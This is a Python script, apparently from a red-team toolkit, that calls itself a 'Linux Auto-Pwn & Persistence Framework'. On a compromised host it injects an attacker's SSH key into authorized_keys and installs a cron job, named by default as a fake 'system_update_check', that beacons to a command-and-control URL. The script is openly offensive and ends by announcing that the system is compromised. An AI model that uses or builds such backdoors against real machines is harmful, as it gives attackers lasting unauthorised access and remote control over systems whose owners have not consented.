#!/usr/bin/env python3
"""
L4/L7 Offensive Framework: Linux Auto-Pwn & Persistence.
Master orchestrator for deploying multiple backdoors (SSH Keys, Cron Beacons)
on a compromised Linux host in a single execution.

Author: 18ilya99
Role: Security Researcher / Red Team Engineer
"""

import argparse
import sys
import os

# Graceful import of attack modules
try:
    from ssh_key_injector import inject_ssh_key
    from cron_persister import install_persistence
except ImportError as e:
    print(f"[-] Critical Import Error: {e}")
    print("[-] Ensure 'ssh_key_injector.py' and 'cron_persister.py' are in the same directory.")
    sys.exit(1)


def print_banner() -> None:
    banner = """
    ================================================
      ☠️  LINUX AUTO-PWN & PERSISTENCE FRAMEWORK ☠️
    ================================================
    """
    print(banner)


def main() -> None:
    print_banner()
    
    parser = argparse.ArgumentParser(description="Master Red Team Orchestrator for Linux Persistence")
    parser.add_argument("--ssh-key", type=str, help="Public SSH key string to inject into authorized_keys")
    parser.add_argument("--c2-url", type=str, help="C2 Server URL for the cron beacon (e.g., http://10.0.0.5:4444/beacon)")
    parser.add_argument("--cron-name", type=str, default="system_update_check", help="Name of the cron job file")
    parser.add_argument("--all", action="store_true", help="Deploy all persistence mechanisms")

    args = parser.parse_args()

    # Require root privileges for system-wide persistence
    if os.getuid() != 0:
        print("[-] Warning: Not running as root. System-wide cron persistence will fail.")
        print("[-] Consider running with sudo for full compromise.\n")

    executed = False

    # 1. Deploy SSH Backdoor
    if args.ssh_key and (args.all or not args.c2_url):
        print("[*] Task 1: Deploying SSH Backdoor...")
        inject_ssh_key(args.ssh_key)
        print("-" * 50)
        executed = True

    # 2. Deploy Cron Beacon
    if args.c2_url and (args.all or not args.ssh_key):
        print("[*] Task 2: Deploying Cron Persistence Beacon...")
        install_persistence(args.c2_url, args.cron_name)
        print("-" * 50)
        executed = True

    if not executed:
        print("[-] No attack vectors selected.")
        parser.print_help()
        sys.exit(1)

    print("[+] Auto-Pwn Complete. The system is compromised.")


if __name__ == "__main__":
    main()